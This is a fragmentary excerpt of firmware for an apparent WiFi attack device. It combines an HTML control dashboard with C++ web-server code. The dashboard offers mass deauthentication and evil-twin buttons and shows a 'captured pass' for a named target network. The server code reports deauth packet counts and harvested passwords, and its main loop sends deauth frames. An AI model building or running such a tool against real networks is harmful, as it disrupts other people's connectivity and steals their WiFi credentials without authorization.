...
<body>
    ...
    <div id="dash">
        <div class='ctrl'>
            ...
            <div class="cmd-box"><button id="btn_ma" class='cmd' style='background:#e60' onclick="run('mass')">MASSDEAUTH</button></div>
            <div class="cmd-box">
            ...
            <div class="cmd-box"><button id="btn_et" class='cmd' style='background:#a53' onclick="run('etwin')">EVILTWIN</button></div>
        </div>
        <hr>
        <div class='pass-box'>
            <b>[ CAPTURED PASS ]</b>
            <div id="passContent">Target: <span id="curTarget">Vivo1903</span><br>Pass : <span id="curPass" class="pass-text">Waiting...</span></div>
        </div>
    </div>
    <div id="webset" class="hidden">
        <div class='set-box'>
            <b style='color:orange'>CONFIG:</b><br>
            SSID: <input class='inp' id="inp_ssid" value="WiFi_Rusuh_87"><br>
            <button class='btn-ok' style='width:100%' onclick="saveSet()">SAVE</button>
        </div>
    </div>
    <script>
        ...
        function saveSet() { fetch('/api?c=set&s='+document.getElementById('inp_ssid').value); }
        setInterval(() => {
...
void setup() {
  ...
  server.on("/stat", HTTP_GET, [](AsyncWebServerRequest *r){
    String j = "{\"de\":"+String(de_on)+",\"be\":"+String(be_on)+",\"p\":\""+captured_pass+"\",\"dp\":"+String(de_pkt)+",\"bp\":"+String(be_pkt)+"}";
...
void loop() {
  ...
  if(de_on) { sendDeauth(); digitalWrite(LED, !digitalRead(LED)); delay(1); }
  if(captured_pass != "Waiting...") { digitalWrite(LED, LOW); delay(50); digitalWrite(LED, HIGH); delay(50); }
}
